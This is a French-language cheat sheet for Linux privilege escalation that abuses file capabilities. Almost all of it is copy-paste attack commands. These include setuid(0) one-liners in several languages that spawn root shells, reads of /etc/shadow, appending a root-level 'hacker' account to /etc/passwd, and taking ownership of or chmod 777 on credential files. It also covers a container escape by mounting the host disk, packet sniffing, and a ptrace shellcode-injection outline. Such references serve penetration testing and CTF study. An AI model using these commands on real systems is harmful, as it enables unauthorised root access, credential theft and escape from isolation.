# Exploitation des capabilities Linux

Guide d'exploitation des capabilities pour l'escalade de privilèges.

---

## Énumération

```bash
getcap -r / 2>/dev/null
```

---

## cap_setuid+ep (devenir root)

### Python

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Perl

```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

### Ruby

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### PHP

```bash
php -r 'posix_setuid(0); system("/bin/bash");'
```

### Node.js

```bash
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
```

### Gawk

```bash
gawk 'BEGIN {system("/bin/bash")}'
```

---

## cap_setgid+ep

### Rejoindre le groupe root/shadow

```bash
python3 -c 'import os; os.setgid(0); os.system("/bin/bash")'
```

### Lire /etc/shadow (groupe shadow = gid 42 souvent)

```bash
python3 -c 'import os; os.setgid(42); print(open("/etc/shadow").read())'
```

---

## cap_dac_override+ep (lire/écrire tout)

### Lire /etc/shadow

```bash
python3 -c 'print(open("/etc/shadow").read())'
cat /etc/shadow
```

### Écrire dans /etc/passwd

```bash
# Générer un hash : openssl passwd -1 "password" -> $1$xyz$...
echo 'hacker:$1$xyz$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### Avec Vim

```bash
vim /etc/shadow
```

---

## cap_dac_read_search+ep (lire tout)

### Avec tar

```bash
tar cvf shadow.tar /etc/shadow
tar xvf shadow.tar
cat etc/shadow
```

### Avec cat

```bash
cat /etc/shadow
```

---

## cap_chown+ep (changer propriétaire)

### S'approprier /etc/passwd

```bash
python3 -c 'import os; os.chown("/etc/passwd", 1000, 1000)'
# Puis modifier /etc/passwd pour ajouter un utilisateur root
```

### S'approprier /etc/shadow

```bash
chown $(id -u):$(id -g) /etc/shadow
```

---

## cap_fowner+ep (bypass vérification propriétaire)

### Changer les permissions de /etc/shadow

```bash
chmod 777 /etc/shadow
cat /etc/shadow
```

---

## cap_net_raw+ep (sniffing)

### Tcpdump

```bash
tcpdump -i any -w capture.pcap
```

### Python scapy

```bash
python3 -c 'from scapy.all import *; sniff()'
```

---

## cap_sys_admin+ep (dangereux)

### Monter un filesystem

```bash
mount /dev/sda1 /mnt
```

### Évasion de conteneur via mount

```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
cat /mnt/host/etc/shadow
```

---

## cap_sys_ptrace+ep (debug processus)

### Injecter dans un process root

```bash
# Utiliser gdb ou strace sur un process root
gdb -p <pid_root_process>
# Puis injecter du shellcode
```

### Injection Python

```python
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.ptrace(16, <pid>, 0, 0)  # PTRACE_ATTACH
# ... inject shellcode
```

---

## cap_net_bind_service+ep

Permet de bind sur un port < 1024 (pas vraiment privesc mais utile).

```bash
python3 -c 'import socket; s=socket.socket(); s.bind(("0.0.0.0",80)); s.listen(1)'
```

---

## Référence GTFOBins

Toujours vérifier : https://gtfobins.github.io/#+capabilities

### Binaires courants exploitables

- python / python3
- perl
- ruby
- php
- node
- vim / vi
- tar
- gdb
- openssl
- gawk / awk

---

## Résumé rapide

| Capability | Action | Cible |
|------------|--------|-------|
| cap_setuid | os.setuid(0) | Root shell |
| cap_setgid | os.setgid(0) | Groupe root |
| cap_dac_* | Lire/écrire tout | /etc/shadow |
| cap_chown | S'approprier fichier | /etc/passwd |
| cap_fowner | chmod tout fichier | /etc/shadow |
| cap_sys_admin | Mount | Évasion conteneur |
| cap_sys_ptrace | Injection process root | Shellcode |
